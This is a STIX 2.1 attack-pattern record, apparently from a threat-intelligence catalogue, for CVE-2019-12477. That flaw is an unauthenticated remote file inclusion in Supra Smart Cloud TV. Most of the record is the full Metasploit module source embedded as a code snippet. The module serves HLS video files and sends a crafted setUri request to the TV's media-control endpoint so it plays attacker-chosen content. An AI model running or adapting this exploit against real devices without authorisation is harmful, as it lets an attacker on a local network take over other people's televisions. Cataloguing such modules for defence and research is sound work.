{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9a481666-f8ab-483f-b2cb-b5c579c26aa3",
    "created": "2024-08-14T16:23:59.283323Z",
    "modified": "2024-08-14T16:23:59.283327Z",
    "name": "Supra Smart Cloud TV Remote File Inclusion",
    "description": " This module exploits an unauthenticated remote file inclusion which exists in Supra Smart Cloud TV. The media control for the device doesn't have any session management or authentication. Leveraging this, an attacker on the local network can send a crafted request to broadcast a fake video. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/supra_smart_cloud_tv_rfi.rb",
            "external_id": "supra_smart_cloud_tv_rfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-12477"
        },
        {
            "source_name": "reference",
            "url": "https://www.inputzero.io/2019/06/hacking-smart-tv.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Supra Smart Cloud TV Remote File Inclusion',\n        'Description' => %q{\n          This module exploits an unauthenticated remote file inclusion which\n          exists in Supra Smart Cloud TV. The media control for the device doesn't\n          have any session management or authentication. Leveraging this, an\n          attacker on the local network can send a crafted request to broadcast a\n          fake video.\n        },\n        'Author' => [\n          'Dhiraj Mishra', # Discovery, PoC, and module\n          'wvu'            # Module\n        ],\n        'References' => [\n          ['CVE', '2019-12477'],\n          ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']\n        ],\n        'DisclosureDate' => '2019-06-03',\n        'License' => MSF_LICENSE\n      )\n    )\n\n    deregister_options('URIPATH')\n  end\n\n  def run\n    start_service('Path' => '/')\n\n    print_status(\"Broadcasting Epic Sax Guy to #{peer}\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/remote/media_control',\n      'encode_params' => false,\n      'vars_get' => {\n        'action' => 'setUri',\n        'uri' => get_uri + 'epicsax.m3u8'\n      }\n    )\n\n    unless res && res.code == 200 && res.body.include?('OK')\n      print_error('No doo-doodoodoodoodoo-doo for you')\n      return\n    end\n\n    # Sleep time calibrated using successful pcap\n    print_good('Doo-doodoodoodoodoo-doo')\n    print_status('Sleeping for 10s serving .m3u8 and .ts files...')\n    sleep(10)\n  end\n\n  def on_request_uri(cli, request)\n    dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-12477')\n\n    files = {\n      '/epicsax.m3u8' => 'application/x-mpegURL',\n      '/epicsax0.ts' => 'video/MP2T',\n      '/epicsax1.ts' => 'video/MP2T',\n      '/epicsax2.ts' => 'video/MP2T',\n      '/epicsax3.ts' => 'video/MP2T',\n      '/epicsax4.ts' => 'video/MP2T'\n    }\n\n    file = request.uri\n\n    unless files.include?(file)\n      vprint_error(\"Sending 404 for #{file}\")\n      return send_not_found(cli)\n    end\n\n    data = File.read(File.join(dir, file), mode: 'rb')\n\n    vprint_good(\"Sending #{file}\")\n    send_response(cli, data, 'Content-Type' => files[file])\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-06-03"
}